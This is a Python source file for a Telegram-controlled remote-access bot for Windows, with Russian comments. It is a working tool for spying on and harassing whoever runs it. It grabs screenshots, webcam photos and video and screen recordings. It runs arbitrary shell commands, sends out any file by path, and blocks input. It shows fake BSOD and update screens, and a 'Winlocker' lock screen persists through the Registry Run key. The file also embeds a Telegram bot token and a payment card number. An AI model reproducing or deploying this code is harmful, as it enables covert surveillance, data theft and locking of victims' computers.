import os
import sys
import subprocess
import time
import platform
import socket
import webbrowser
import threading
import tkinter as tk
from tkinter import messagebox
import traceback
import requests
import cv2

# Зависимости и соответствующие им имена модулей для импорта
REQUIRED = {
    "pyTelegramBotAPI": "telebot",
    "pyautogui": "pyautogui",
    "Pillow": "PIL",
    "psutil": "psutil",
    "pygame": "pygame",
    "opencv-python": "cv2",
}

def try_import(module_name: str) -> bool:
    try:
        __import__(module_name)
        return True
    except Exception:
        return False

def install_package(pkg_name: str) -> bool:
    """Устанавливаем пакет через pip только в dev режиме (не из .exe)."""
    if getattr(sys, "frozen", False):
        return False
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_name])
        return True
    except Exception as e:
        print(f"Failed to install {pkg_name}: {e}", file=sys.stderr)
        return False

# Проверяем зависимости — в режиме .exe просто выводим список отсутствующих и выходим
missing = []
for pkg, mod in REQUIRED.items():
    if not try_import(mod):
        missing.append((pkg, mod))

if missing:
    if getattr(sys, "frozen", False):
        names = ", ".join(p for p, _ in missing)
        msg = (
            "Отсутствуют зависимости для работы .exe: " + names + "\n"
            "Соберите .exe в окружении, где установлены эти пакеты, или добавьте их в сборку PyInstaller.\n"
            "Пример: pip install " + " ".join(p for p, _ in missing)
        )
        print(msg, file=sys.stderr)
        # Для GUI-версии можно показать messagebox, но в .exe лучше просто выйти с кодом 1
        sys.exit(1)
    else:
        # Dev режим: попробуем установить автоматически
        for pkg, mod in missing:
            print(f"Устанавливаю {pkg} ...")
            ok = install_package(pkg)
            if not ok:
                print(f"Не удалось установить {pkg}.", file=sys.stderr)
                sys.exit(1)
        # повторный импорт проверим автоматически ниже

# Теперь безопасно импортируем сторонние библиотеки
try:
    from PIL import Image, ImageTk, ImageGrab
    import pyautogui
    import psutil
    import cv2
    import ctypes
    import telebot
    import pygame
    import winreg
except Exception as e:
    print("Ошибка при импорте сторонних библиотек:", e, file=sys.stderr)
    if getattr(sys, "frozen", False):
        sys.exit(1)
    else:
        raise

# --- Конфигурация ---
TOKEN = "7377054924:AAEnR9ti6y2mT3YbVMQKQbBJQpWsQWaJ6qk"
ADMIN_ID = 5782683757
bot = telebot.TeleBot(TOKEN)
user_state = {}

REQUIRED_LIBS = {
    "pyTelegramBotAPI": "telebot",
    "pyautogui": "pyautogui",
    "Pillow": "PIL",
    "psutil": "psutil",
    "pygame": "pygame",
    "opencv-python": "cv2",
}

def try_import(module_name):
    try:
        __import__(module_name)
        return True
    except ImportError:
        return False

def install_with_pip(package_name):
    # вызываем pip только если мы НЕ в упакованном exe
    if getattr(sys, "frozen", False):
        raise RuntimeError(f"Не могу установить пакет '{package_name}' изнутри .exe. Установите пакет перед сборкой.")
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

missing = []
for pkg_name, module_name in REQUIRED_LIBS.items():
    if not try_import(module_name):
        missing.append(pkg_name)

if missing:
    if getattr(sys, "frozen", False):
        # На этапе уже упакованного exe — просто сообщить и завершить
        msg = ("Отсутствуют зависимости: " + ", ".join(missing) +
               "\nУстановите их в окружении разработчика и пересоберите .exe:\n"
               "pip install " + " ".join(missing))
        # печатаем в stdout/stderr и аккуратно выходим
        print(msg, file=sys.stderr)
        # можно также послать лог через GUI или записать в файл
        sys.exit(1)
    else:
        # В dev режиме — пробуем установить автоматически
        for pkg in missing:
            print(f"Устанавливаю {pkg} ...")
            install_with_pip(pkg)
        # После установки можно попытаться импортировать заново (опционально)
        for _, module_name in REQUIRED_LIBS.items():
            try:
                __import__(module_name)
            except ImportError as e:
                print("Ошибка при импорте после установки:", e, file=sys.stderr)
                sys.exit(1)

# --- Главное меню ---
def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📸 Скриншот", "🌐 Поиск в браузере")
    markup.add("📂 Открыть приложение", "❌ Закрыть приложение")
    markup.add("⌨️ Напечатать текст", "🖱 Переместить мышь")
    markup.add("💬 Сообщение", "🖥 Выключить ПК")
    markup.add("🔄 Перезагрузить ПК", "🔒 Заблокировать ПК")
    markup.add("⛔ Блокировка ввода", "⌨️ Горячие клавиши")
    markup.add("🖥 Системная информация", "👻 Скример")
    markup.add("Black screen", "Fake update")
    markup.add("Meme spam", "💀 Фейковый BSOD")
    markup.add("📹 Вебкамера 8 сек", "🚀 Поддержать автора")
    markup.add("▶️ Запустить Winlocker🔐", "⏹ Остановить WINLOCKER🔐")
    markup.add("📁 Список файлов", "📤 Отправить файл")
    markup.add("📹 Вебкамера 8 сек", "📷 Фото с вебкамеры")  # добавлена кнопка фото с вебки
    markup.add("🔇 Отключить звук", "🔊 Включить звук")
    markup.add("📥 Загрузить файл", "🎥 Скринкаст 10 сек")
    markup.add("🔊 Громкость 100%", "💻 Выполнить команду")
    markup.add("🖼 Сменить обои", "⏩ Обновить бота")
    markup.add("🔄 Перезапуск бота", "🛑 Остановить бота")
    return markup

# --- Локальные функции (пример: black screen, fake update, meme spam) ---
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
MEME_DIR = os.path.join(BASE_DIR, "memes")

def local_black_screen(duration=5):
    def _run():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.configure(bg="black")
        root.attributes("-topmost", True)
        root.bind("<Escape>", lambda e: root.destroy())
        root.after(int(duration * 1000), root.destroy)
        root.mainloop()
    threading.Thread(target=_run, daemon=True).start()

def local_fake_update(duration=8, update_interval=0.5):
    def _run():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.overrideredirect(True)

        screen_w = root.winfo_screenwidth()
        screen_h = root.winfo_screenheight()

        canvas = tk.Canvas(root, width=screen_w, height=screen_h, bg="#0078D7", highlightthickness=0)
        canvas.pack()

        title_font = ("Segoe UI", max(16, int(screen_h * 0.04)), "bold")
        msg_font = ("Segoe UI", max(10, int(screen_h * 0.02)))

        canvas.create_text(screen_w//2, int(screen_h*0.25), text="Installing updates", font=title_font, fill="white")
        canvas.create_text(screen_w//2, int(screen_h*0.35), text="Please do not turn off your computer.", font=msg_font, fill="white")

        bar_w = int(screen_w * 0.6)
        bar_h = max(12, int(screen_h * 0.03))
        bar_x = (screen_w - bar_w) // 2
        bar_y = int(screen_h * 0.5)
        canvas.create_rectangle(bar_x, bar_y, bar_x + bar_w, bar_y + bar_h, fill="#004c87", outline="")
        progress_rect = canvas.create_rectangle(bar_x, bar_y, bar_x, bar_y + bar_h, fill="#00c853", outline="")

        cpu_id = canvas.create_text(screen_w//2, bar_y + int(screen_h*0.06), text="CPU: --%    RAM: --%", font=msg_font, fill="white")

        start = time.time()
        def upd():
            elapsed = time.time() - start
            frac = min(1.0, elapsed / duration)
            new_w = bar_x + int(bar_w * frac)
            canvas.coords(progress_rect, bar_x, bar_y, new_w, bar_y + bar_h)
            try:
                cpu = psutil.cpu_percent(interval=None)
                ram = psutil.virtual_memory().percent
                canvas.itemconfigure(cpu_id, text=f"CPU: {int(cpu)}%    RAM: {int(ram)}%")
            except Exception:
                pass

            if elapsed < duration:
                root.after(int(update_interval * 1000), upd)
            else:
                root.destroy()

        root.after(0, upd)
        root.bind("<Escape>", lambda e: root.destroy())
        root.mainloop()

    threading.Thread(target=_run, daemon=True).start()

# ...existing code...
@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "cmd_command")
def execute_cmd_command(message):
    try:
        command = message.text.strip()
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        # Если вывод большой — отправляем как файл
        if len(result) > 3500:
            import tempfile
            tf = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
            tf.write(result)
            tf.close()
            with open(tf.name, "rb") as f:
                bot.send_document(message.chat.id, f)
            os.remove(tf.name)
        else:
            bot.send_message(message.chat.id, f"✅ Результат выполнения команды:\n{result}")
    except subprocess.CalledProcessError as e:
        out = e.output or str(e)
        if len(out) > 3500:
            import tempfile
            tf = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
            tf.write(out)
            tf.close()
            with open(tf.name, "rb") as f:
                bot.send_document(message.chat.id, f)
            os.remove(tf.name)
        else:
            bot.send_message(message.chat.id, f"❌ Ошибка выполнения команды:\n{out}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
    finally:
        user_state[message.chat.id] = None


def local_meme_spam(folder=MEME_DIR, count=5, show_time=1.2):
    if not os.path.isdir(folder):
        try:
            root = tk.Tk(); root.withdraw(); messagebox.showerror("Meme spam", f"Папка с мемами не найдена: {folder}"); root.destroy()
        except:
            pass
        return

    images = [os.path.join(folder, f) for f in os.listdir(folder)
              if f.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp"))]
    if not images:
        try:
            root = tk.Tk(); root.withdraw(); messagebox.showerror("Meme spam", "В папке нет изображений."); root.destroy()
        except:
            pass
        return

    def _show_image(path, duration):
        try:
            root = tk.Tk()
            root.overrideredirect(True)
            root.attributes("-topmost", True)
            img = Image.open(path)
            screen_w = root.winfo_screenwidth()
            screen_h = root.winfo_screenheight()
            ratio = min(screen_w / img.width, screen_h / img.height, 1.0)
            new_w = int(img.width * ratio)
            new_h = int(img.height * ratio)
            try:
                resample = Image.Resampling.LANCZOS
            except AttributeError:
                resample = Image.ANTIALIAS
            img = img.resize((new_w, new_h), resample)
            tk_img = ImageTk.PhotoImage(img)
            lbl = tk.Label(root, image=tk_img, bg="black")
            lbl.image = tk_img
            lbl.pack()
            x = (screen_w - new_w) // 2
            y = (screen_h - new_h) // 2
            root.geometry(f"{new_w}x{new_h}+{x}+{y}")
            root.after(int(duration * 1000), root.destroy)
            root.mainloop()
        except Exception as e:
            print("Error showing meme:", e)

    def _run():
        for i, img in enumerate(images[:count]):
            _show_image(img, show_time)
            time.sleep(0.05)

    threading.Thread(target=_run, daemon=True).start()

def play_sound(file):
    def _play():
        pygame.mixer.init()
        pygame.mixer.music.load(file)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
    threading.Thread(target=_play).start()

# Событие управления
script_stop_event = threading.Event()
script_thread = None

def kiosk_gui(stop_event: threading.Event, password: str):
    add_to_autostart()
    """
    Полноэкранный GUI. Закрывается только при вводе правильного пароля
    или когда stop_event установлен извне (бот прислал команду остановки).
    """
    try:
        root = tk.Tk()
        root.title("Заблокировано (demo)")

        root = tk.Tk()
        root.title("Заблокировано (demo)")
        root.attributes("-fullscreen", True)
# не используем root.overrideredirect(True)



        def disable_event(event=None):
            return "break"

        root.protocol("WM_DELETE_WINDOW", disable_event)
        root.bind("<Alt-F4>", disable_event)

        try:
            root.grab_set()
        except Exception:
            pass

        frame = tk.Frame(root, bg="black")
        frame.pack(fill="both", expand=True)

        lbl = tk.Label(frame, text="УСТРОЙСТВО ЗАБЛОКИРОВАНО", font=("Arial", 36), fg="white", bg="black")
        lbl.pack(pady=60)

        info = tk.Label(frame, text="Введите пароль для разблокировки", font=("Arial", 20), fg="white", bg="black")
        info.pack(pady=10)

        entry = tk.Entry(frame, show="*", font=("Arial", 24))
        entry.pack(pady=10)
        entry.focus_set()

        status = tk.Label(frame, text="", font=("Arial", 16), fg="red", bg="black")
        status.pack(pady=6)

        def check_password():
            if entry.get() == password:
                remove_from_autostart()
                try:
                    root.grab_release()
                except Exception:
                    pass
                root.destroy()
            else:
                status.config(text="Неверный пароль")
                entry.delete(0, tk.END)

        btn = tk.Button(frame, text="Разблокировать", font=("Arial", 18), command=check_password)
        btn.pack(pady=20)

        def poll():
            if stop_event.is_set():
                try:
                    root.grab_release()
                except Exception:
                    pass
                try:
                    root.destroy()
                except Exception:
                    pass
                return
            try:
                root.lift()
                root.attributes("-topmost", True)
                root.after(1, lambda: root.attributes("-topmost", False))
                root.attributes("-topmost", True)
                entry.focus_force()
            except Exception:
                pass
            root.after(500, poll)

        root.after(500, poll)
        root.mainloop()

    except Exception:
        write_gui_log("GUI exception:")
        write_gui_log(traceback.format_exc())
    finally:
        stop_event.set()

def show_screamer():
    base_path = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.abspath(".")
    img_path = os.path.join(base_path, "scary.png")
    sound_path = os.path.join(base_path, "scream.mp3")
    play_sound(sound_path)
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    img = Image.open(img_path)
    img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.ANTIALIAS)
    tk_img = ImageTk.PhotoImage(img)
    label = tk.Label(root, image=tk_img)
    label.pack()
    root.after(3000, root.destroy)
    label.bind("<Button-1>", lambda e: root.destroy())
    root.mainloop()

def record_webcam(filename="webcam.mp4", duration=8):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return False
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (width, height))
    start_time = time.time()
    while time.time() - start_time < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    cap.release()
    out.release()
    return True

def show_real_bsod():
    def _run():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.configure(bg="black")
        root.bind("<Escape>", lambda e: root.destroy())

        canvas = tk.Canvas(root, bg="black")
        canvas.pack(fill="both", expand=True)

        screen_w = root.winfo_screenwidth()
        screen_h = root.winfo_screenheight()

        images = ["bsod1.png", "bsod2.png"]
        photo_refs = []

        for img_path in images:
            if not os.path.exists(img_path):
                continue

            img = Image.open(img_path)
            try:
                resample_mode = Image.Resampling.LANCZOS
            except AttributeError:
                resample_mode = Image.ANTIALIAS

            img_resized = img.resize((screen_w, screen_h), resample_mode)
            tk_img = ImageTk.PhotoImage(img_resized)
            photo_refs.append(tk_img)
            canvas.create_image(0, 0, anchor="nw", image=tk_img)
            root.update()
            time.sleep(2)
            canvas.delete("all")

        root.destroy()

    threading.Thread(target=_run, daemon=True).start()

def block_input(seconds):
    def _block():
        try:
            ctypes.windll.user32.BlockInput(True)
            time.sleep(seconds)
        finally:
            ctypes.windll.user32.BlockInput(False)
    threading.Thread(target=_block, daemon=True).start()

def restart_bot():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def add_to_autostart():
    exe_path = sys.executable
    script_path = os.path.abspath(__file__)
    # Если скрипт упакован в exe, используем exe, иначе python + script
    if exe_path.lower().endswith("python.exe"):
        run_path = f'"{exe_path}" "{script_path}"'
    else:
        run_path = f'"{exe_path}"'
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Winlocker", 0, winreg.REG_SZ, run_path)
    winreg.CloseKey(key)

def remove_from_autostart():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "Winlocker")
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass


# --- Telegram handlers ---
@bot.message_handler(commands=["start"])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Доступ запрещён!")
        return
    bot.send_message(message.chat.id, "✅ Бот запущен. Выберите действие:", reply_markup=main_menu())

PASSWORD = "5090"  # Set your unlock password here

@bot.message_handler(func=lambda message: message.text == "🔊 Громкость 100%")
def set_volume_max(message):
    try:
        ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)  # Устанавливаем громкость на максимум
        bot.send_message(message.chat.id, "🔊 Громкость выставлена на 100%")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Не удалось изменить громкость: {e}")
        
@bot.message_handler(func=lambda message: message.text == "🖼 Сменить обои")
def change_wallpaper_request(message):
    bot.send_message(message.chat.id, "Отправьте изображение для установки в качестве обоев рабочего стола.")

@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        wallpaper_path = os.path.join(BASE_DIR, "wallpaper.jpg")
        with open(wallpaper_path, "wb") as f:
            f.write(downloaded_file)

        # Устанавливаем обои
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
        bot.send_message(message.chat.id, "✅ Обои рабочего стола успешно изменены.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка при установке обоев: {e}")

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    global script_thread, script_stop_event  # <-- Add this line
    if message.text == "💀 тест":
        show_real_bsod()
        bot.send_message(message.chat.id, "💀 Фейковый BSOD запущен на 10 секунд!")

    elif message.text == "📸 Скриншот":
        screenshot = ImageGrab.grab()
        path = "screenshot.png"
        screenshot.save(path)
        with open(path, "rb") as img:
            bot.send_photo(message.chat.id, img)

    # --- Добавлена обработка команды для выполнения в CMD ---
    elif message.text == "💻 Выполнить команду":
        if message.chat.id != ADMIN_ID:
            bot.send_message(message.chat.id, "⛔ У вас нет прав для выполнения этой команды.")
            return
        bot.send_message(message.chat.id, "Введите команду для выполнения (будет выполнена в shell):")
        user_state[message.chat.id] = "cmd_command"

    elif message.text == "Fake update":
        bot.send_message(message.chat.id, "Фейк апдейт запущен!")
        local_fake_update(duration=10)

    elif message.text == "🔄 Перезапуск бота":
        bot.send_message(message.chat.id, "♻️ Перезапускаю бота...")
        restart_bot()

    elif message.text == "💀 Фейковый BSOD":
        show_real_bsod()
        bot.send_message(message.chat.id, "💀 Фейковый BSOD запущен!")

    elif message.text == "⛔ Блокировка ввода":
        block_input(10)
        bot.send_message(message.chat.id, "⛔ Ввод заморожен на 10 секунд!")

    elif message.text == "🌐 Поиск в браузере":
        bot.send_message(message.chat.id, "Введите запрос:")
        user_state[message.chat.id] = "search"



    elif message.text == "▶️ Запустить Winlocker🔐":
        if script_thread and script_thread.is_alive():
            bot.send_message(message.chat.id, "🔐 WINLOCKER уже работает ⚠️")
        else:
            script_stop_event.clear()
            script_thread = threading.Thread(target=kiosk_gui, args=(script_stop_event, PASSWORD), daemon=True)
            script_thread.start()
            bot.send_message(message.chat.id, "🔐 WINLOCKER запущен ✅")

    elif message.text == "⏹ Остановить WINLOCKER🔐":
        if script_thread and script_thread.is_alive():
            script_stop_event.set()
            bot.send_message(message.chat.id, "⏹ WINLOCKER остановлен")
        else:
            bot.send_message(message.chat.id, "⏹ WINLOCKER не запущен")

    elif message.text == "⏩ Обновить бота":
        if message.chat.id != ADMIN_ID:
            bot.send_message(message.chat.id, "⛔ У вас нет прав для выполнения этой команды.")
            return

        bot.send_message(message.chat.id, "♻️ Проверяю обновления...")

        try:
            # URL репозитория с обновлением
            repo_url = "https://raw.githubusercontent.com/RBXLU/pccontrol/main/bot.py"
            response = requests.get(repo_url)

            if response.status_code == 200:
                # Сохраняем резервную копию текущего файла
                current_file = os.path.abspath(__file__)
                backup_file = current_file + ".bak"
                try:
                    os.rename(current_file, backup_file)
                    bot.send_message(message.chat.id, "✅ Резервная копия создана.")
                except Exception as e:
                    bot.send_message(message.chat.id, f"⚠️ Не удалось создать резервную копию: {e}")
                    return

                # Сохраняем обновлённый файл
                try:
                    with open(current_file, "wb") as f:
                        f.write(response.content)
                    bot.send_message(message.chat.id, "✅ Бот успешно обновлён! Перезапускаю...")
                    restart_bot()
                except Exception as e:
                    # Восстанавливаем резервную копию в случае ошибки
                    os.rename(backup_file, current_file)
                    bot.send_message(message.chat.id, f"⚠️ Ошибка при обновлении: {e}. Резервная копия восстановлена.")
            else:
                bot.send_message(message.chat.id, f"⚠️ Обновление недоступно. Код ответа: {response.status_code}")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Ошибка при проверке обновлений: {e}")

    elif message.text == "Meme spam":
        bot.send_message(message.chat.id, "Спам мемами запущен!")
        local_meme_spam(folder=MEME_DIR, count=5, show_time=1.0)

    elif message.text == "📂 Открыть приложение":
        bot.send_message(message.chat.id, "Введите имя приложения:")
        user_state[message.chat.id] = "open_app"

    elif message.text == "❌ Закрыть приложение":
        bot.send_message(message.chat.id, "Введите имя процесса:")
        user_state[message.chat.id] = "close_app"

    elif message.text == "⌨️ Напечатать текст":
        bot.send_message(message.chat.id, "Введите текст для печати:")
        user_state[message.chat.id] = "type_text"

    elif message.text == "🖱 Переместить мышь":
        bot.send_message(message.chat.id, "Введите X Y (например: 500 300):")
        user_state[message.chat.id] = "move_mouse"

    elif message.text == "Black screen":
        bot.send_message(message.chat.id, "Черный экран запущен!")
        local_black_screen(duration=5)
        bot.send_message(message.chat.id, "✅ Black screen запущен на хосте.")

    elif message.text == "💬 Сообщение":
        bot.send_message(message.chat.id, "Введите текст сообщения:")
        user_state[message.chat.id] = "send_message"

    elif message.text == "🚀 Поддержать автора":
        bot.send_message(message.chat.id, "Если вам нравится этот бот, вы можете поддержать автора отправив донат на карту:\n\n💳 4441 1144 3356 7409\n\nЗаранее cпасибо вашу поддержку!")

    elif message.text == "🖥 Выключить ПК":
        os.system("shutdown /s /t 10")
        bot.send_message(message.chat.id, "⏳ Выключение через 10 секунд...")

    elif message.text == "🔄 Перезагрузить ПК":
        os.system("shutdown /r /t 10")
        bot.send_message(message.chat.id, "⏳ Перезагрузка через 10 секунд...")

    elif message.text == "🔒 Заблокировать ПК":
        os.system("rundll32.exe user32.dll,LockWorkStation")
        bot.send_message(message.chat.id, "🔒 ПК заблокирован")

    elif message.text == "⛔ Отмена выключения":
        os.system("shutdown /a")
        bot.send_message(message.chat.id, "❌ Выключение отменено")

    elif message.text == "🛑 Остановить бота":
        bot.send_message(message.chat.id, "🛑 Бот остановлен")
        os._exit(0)

    elif message.text == "⌨️ Горячие клавиши":
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Ctrl+C", "Alt+F4", "Win+D", "🔙 Назад")
        bot.send_message(message.chat.id, "Выберите комбинацию:", reply_markup=markup)

    elif message.text in ["Ctrl+C", "Alt+F4", "Win+D", "🔙 Назад"]:
        if message.text == "Ctrl+C":
            pyautogui.hotkey('ctrl', 'c')
        elif message.text == "Alt+F4":
            pyautogui.hotkey('alt', 'f4')
        elif message.text == "Win+D":
            pyautogui.hotkey('win', 'd')
        if message.text == "🔙 Назад":
            bot.send_message(message.chat.id, "Главное меню:", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, f"✅ Выполнено {message.text}")

    elif message.text == "🖥 Системная информация":
        info = f"""
💻 Имя ПК: {platform.node()}
👤 Пользователь: {os.getlogin()}
🖥 ОС: {platform.system()} {platform.release()}
🌐 IP: {socket.gethostbyname(socket.gethostname())}
⏱ Uptime: {int(time.time() - psutil.boot_time())} секунд
⚡ CPU: {psutil.cpu_percent()}%
💾 RAM: {psutil.virtual_memory().percent}%
📀 Диски: {', '.join([d.device for d in psutil.disk_partitions()])}
"""
        bot.send_message(message.chat.id, info)

    elif message.text == "👻 Скример":
        try:
            show_screamer()
        except:
            pass
        bot.send_message(message.chat.id, "👻 Скример сработал!")

    elif message.text == "🔊 Включить звук":
        try:
            ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)
            bot.send_message(message.chat.id, "🔊 Звук включён (громкость 100%)")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Не удалось включить звук: {e}")\
                
    elif message.text == "🔇 Отключить звук":
        try:
            # Устанавливаем громкость на 0 (влияет на waveOut устройства)
            ctypes.windll.winmm.waveOutSetVolume(0, 0x0000)
            bot.send_message(message.chat.id, "🔇 Звук отключён (громкость 0%)")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Не удалось отключить звук: {e}")

    elif message.text == "📷 Фото с вебкамеры":
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                bot.send_message(message.chat.id, "❌ Не удалось открыть веб-камеру")
            else:
                ret, frame = cap.read()
                cap.release()
                if not ret:
                    bot.send_message(message.chat.id, "❌ Не удалось получить кадр с веб-камеры")
                else:
                    import tempfile
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".jpg")
                    tmp_name = tmp.name
                    tmp.close()
                    cv2.imwrite(tmp_name, frame)
                    with open(tmp_name, "rb") as img:
                        bot.send_photo(message.chat.id, img)
                    try:
                        os.remove(tmp_name)
                    except Exception:
                        pass
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка при съёмке: {e}")

    elif message.text == "📹 Вебкамера 8 сек":
        bot.send_message(message.chat.id, "Запись вебкамеры...")
        filename = "webcam.mp4"
        if record_webcam(filename, duration=8):
            with open(filename, "rb") as vid:
                bot.send_video(message.chat.id, vid)
        else:
            bot.send_message(message.chat.id, "❌ Не удалось записать видео")
            
    elif message.text == "🔊 Громкость 100%":
        try:
            devices = ctypes.windll.winmm.waveOutGetNumDevs()
            ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)
            bot.send_message(message.chat.id, "🔊 Громкость выставлена на 100%")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Не удалось изменить громкость: {e}")

    elif message.text == "🖱 Левый клик":
        pyautogui.click()
        bot.send_message(message.chat.id, "🖱 Левый клик выполнен")
    elif message.text == "🖱 Правый клик":
        pyautogui.click(button='right')
        bot.send_message(message.chat.id, "🖱 Правый клик выполнен")

    # --- Обработка состояний ---
    elif user_state.get(message.chat.id) == "search":
        webbrowser.open(f"https://www.google.com/search?q={message.text}")
        bot.send_message(message.chat.id, f"🌐 Открыл поиск: {message.text}")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "open_app":
        try:
            os.startfile(message.text)
            bot.send_message(message.chat.id, f"✅ Открыл {message.text}")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Ошибка: {e}")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "close_app":
        closed = False
        for proc in psutil.process_iter(attrs=["pid", "name"]):
            if message.text.lower() in proc.info["name"].lower():
                proc.kill()
                bot.send_message(message.chat.id, f"❌ Закрыл {proc.info['name']}")
                closed = True
        if not closed:
            bot.send_message(message.chat.id, "⚠️ Приложение не найдено")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "type_text":
        pyautogui.typewrite(message.text)
        bot.send_message(message.chat.id, "⌨️ Напечатал текст")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "move_mouse":
        try:
            x, y = map(int, message.text.split())
            pyautogui.moveTo(x, y, duration=0.5)
            bot.send_message(message.chat.id, f"🖱 Переместил мышь в {x},{y}")
        except:
            bot.send_message(message.chat.id, "⚠️ Введите X Y корректно (например: 500 300)")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "send_message":
        pyautogui.alert(message.text)
        bot.send_message(message.chat.id, "📩 Сообщение показано")
        user_state[message.chat.id] = None

    elif message.text == "📁 Список файлов":
        files = os.listdir(BASE_DIR)
        files_str = "\n".join(files)
        bot.send_message(message.chat.id, f"Файлы в папке:\n{files_str}")

    elif message.text == "📤 Отправить файл":
        bot.send_message(
            message.chat.id,
            "Введи полный путь к файлу для отправки (например, C:\\Users\\Имя\\Desktop\\file.txt):"
        )
        user_state[message.chat.id] = "send_file"
        return

    if user_state.get(message.chat.id) == "send_file":
        filepath = message.text.strip()
        if os.path.isfile(filepath):
            try:
                with open(filepath, "rb") as f:
                    bot.send_document(message.chat.id, f)
                bot.send_message(message.chat.id, "✅ Файл отправлен")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Ошибка при отправке файла: {e}")
        else:
            bot.send_message(message.chat.id, "❌ Файл не найден. Проверь путь и попробуй снова.")
        user_state[message.chat.id] = None
        return

    elif message.text == "🎥 Скринкаст 10 сек":
        bot.send_message(message.chat.id, "Запись экрана 10 секунд...")
        import numpy as np
        import cv2

        filename = "screencast.mp4"
        screen = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(filename, fourcc, 10.0, screen)
        start = time.time()
        while time.time() - start < 10:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
        out.release()
        with open(filename, "rb") as f:
            bot.send_video(message.chat.id, f)
        bot.send_message(message.chat.id, "🎥 Скринкаст отправлен")

if __name__ == "__main__":
    bot.polling(none_stop=True)
